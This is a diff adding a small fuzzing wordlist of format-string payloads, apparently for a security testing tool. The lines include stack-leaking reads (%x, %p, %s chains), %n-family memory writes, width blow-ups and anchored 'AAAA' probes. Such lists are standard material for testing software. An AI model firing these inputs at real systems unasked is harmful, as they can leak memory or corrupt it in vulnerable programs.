@@ -1,0 +1,38 @@
+# Format-string — the printf %s %x %n family.
+# A fast-start set, not a wordlist manager; extend with a merge file for depth.
+# Blank lines and lines starting with '#' are comments (skipped at load).
+
+# Single conversions
+%s
+%d
+%i
+%u
+%o
+%c
+%x
+%X
+%p
+%n
+
+# Repeated reads (leak the stack)
+%s%s%s%s%s%s%s%s
+%x%x%x%x%x%x%x%x
+%p%p%p%p%p%p%p%p
+%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
+
+# Writes (%n family)
+%n%n%n%n%n%n%n%n
+%hn
+%hhn
+
+# Width / precision blow-ups
+%08x
+%.1024d
+%.2049d
+%99999999s
+%1$s
+%1$n
+
+# Anchored, easy to spot in output
+AAAA%08x.%08x.%08x.%08x
+AAAA%n
